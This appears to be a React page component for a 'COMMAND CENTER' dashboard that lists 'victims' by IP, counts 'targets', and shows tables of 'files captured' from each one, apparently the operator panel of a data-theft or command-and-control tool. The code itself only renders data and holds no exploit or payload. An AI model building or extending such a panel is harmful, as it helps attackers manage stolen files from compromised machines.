import { useState, useEffect } from "react"

import { useRawData } from "@/hooks"
import { Monitor, FileText, Globe, HardDrive } from "lucide-react"
import StatCard from "@/components/StatCard"
import VictimCard from "@/components/VictimCard"
import VictimList from "@/components/VictimList"
import FileTable from "@/components/FileTable"

const Index = () => {
  const { getRawData, rawData: data } = useRawData()

  useEffect(() => {
    getRawData()
  }, [])

  const [selectedId, setSelectedId] = useState<number | null>(null)

  useEffect(() => {
    if (data.victims.length === 0) {
      setSelectedId(null)
      return
    }

    const selectedStillExists =
      selectedId !== null && data.victims.some((v) => v.id === selectedId)

    if (!selectedStillExists) {
      setSelectedId(data.victims[0].id)
    }
  }, [data.victims, selectedId])

  const selectedVictim =
    selectedId === null ? null : data.victims.find((v) => v.id === selectedId)

  return (
    <div className="relative min-h-screen">
      <div className="starfield" />

      <div className="relative z-10 mx-auto max-w-7xl px-6 py-10">
        <div className="mb-10">
          <h1 className="font-display text-3xl font-black tracking-wider text-foreground md:text-4xl">
            <span className="text-primary">?</span> COMMAND CENTER
          </h1>
          <p className="mt-1 font-mono-space text-sm text-muted-foreground">
            System monitoring &middot; Real-time telemetry
          </p>
        </div>

        <div className="mb-8 grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">
          <StatCard
            label="Total Targets"
            value={data.count}
            icon={Monitor}
            variant="primary"
          />
          <StatCard
            label="Files Captured"
            value={data.victims.reduce((sum, v) => sum + v.files.length, 0)}
            icon={FileText}
            variant="secondary"
          />
          <StatCard
            label="Active IPs"
            value={data.victims.length}
            icon={Globe}
            variant="success"
          />
          <StatCard
            label="Storage"
            value={`${
              data.victims.reduce((sum, v) => sum + v.files.length, 0) * 2
            } items`}
            icon={HardDrive}
            variant="warning"
          />
        </div>

        <div className="grid gap-6 lg:grid-cols-12">
          <div className="lg:col-span-4">
            <VictimList
              victims={data.victims}
              selectedId={selectedId}
              onSelect={setSelectedId}
            />
          </div>
          <div className="lg:col-span-8 space-y-6">
            {selectedVictim && (
              <>
                <VictimCard {...selectedVictim} />
                <FileTable files={selectedVictim.files} />
              </>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

export default Index
